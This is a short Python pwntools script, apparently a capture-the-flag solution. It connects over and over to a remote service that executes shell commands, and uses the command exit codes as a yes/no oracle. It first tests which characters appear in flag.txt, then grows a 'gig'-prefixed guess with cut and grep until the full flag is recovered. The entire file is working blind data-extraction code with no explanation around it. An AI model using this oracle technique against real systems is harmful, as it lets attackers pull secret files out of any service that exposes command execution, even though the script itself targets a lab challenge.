#!/usr/bin/env python3
from pwn import remote, context

host = "192.168.1.100"
port = 3424

context.log_level = "critical"

clist = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N",
         "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b",
         "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
         "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4",
         "5", "6", "7", "8", "9", "0",  "}", "{", "_"]

blist = []

flag = list("gig")


def cgtrue(p):
    command = f"cat flag.txt | grep {p}"
    victim = remote(host, port)
    victim.recv()
    victim.sendline(command)
    returncode = int(victim.recvuntil("\n", drop=True).decode("latin-1"))
    if returncode == 0:
        clist.remove(p)
        blist.append(p)
    elif returncode != 0:
        clist.remove(p)
    victim.close()


def getflag(z):
    use = "".join(flag) + z
    command = f"cat flag.txt | cut -c -{len(use)} | grep {use}"
    r = remote(host, port)
    r.recv()
    r.sendline(command)
    returncode = int(r.recvuntil("\n", drop=True).decode("latin-1"))
    if returncode == 0:
        flag.append(z)
    r.close()


while 1:
    for p in clist:
        cgtrue(p)
    if len(clist) == 0:
        break


while 2:
    for z in blist:
        getflag(z)
    if flag[-1] == "}":
        print(flag)
        break
